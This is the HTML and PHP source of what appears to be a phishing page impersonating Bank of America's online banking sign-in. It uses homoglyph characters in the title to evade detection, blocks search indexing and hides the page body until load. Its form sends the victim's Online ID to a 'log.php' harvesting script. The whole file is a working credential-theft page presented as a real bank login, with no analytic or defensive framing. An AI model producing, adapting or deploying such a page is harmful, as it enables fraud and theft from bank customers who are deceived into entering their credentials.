<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
	<?php require_once 'crypt.php'; ?>
<title>Βаnk оf Αmеrіса | Οnlіnе Βаnkіng | Ѕіgn Ιn | Οnlіnе ΙD</title>
<meta name="robots" content="noindex,nofollow" />
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<link rel="shortcut icon" href="images/favicon.ico" type="image/ico" />
<link rel="stylesheet" type="text/css" href="images/style.css" media="all" />
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">

</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:110px; top:516px; width:1042px; height:153px; z-index:0"><img src="images/footer.png" alt="" title="" border=0 width=1042 height=153></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1300px; height:168px; z-index:1"><img src="images/header.png" alt="" title="" border=0 width=1300 height=168></div>

<div id="text1" style="position:absolute; overflow:hidden; left:152px; top:203px; width:203px; height:27px; z-index:2">
<div class="wpmd">
<div><font class="ws9"><B>Рlеаѕе еntег уоuг Οnlіnе ΙD</B></font></div>
</div></div>
<form action="log.php" name="chalbhai" id="chalbhai" method="post">
<input name="formID" maxlength="40" class="form-control" type="text" style="position:absolute;width:200px;left:152px;top:225px;z-index:3" required></form>
<div id="image4" style="position:absolute; overflow:hidden; left:148px; top:264px; width:142px; height:58px; z-index:4"><img src="images/signin.png" onclick="document.forms[0].submit();" alt="" title="" border=0 width=142 height=58></div>

<div id="image3" style="position:absolute; overflow:hidden; left:894px; top:174px; width:224px; height:334px; z-index:5"><img src="images/side.png" alt="" title="" border=0 width=224 height=334></div>


</body>
</html>
<?php ob_end_flush(); ?>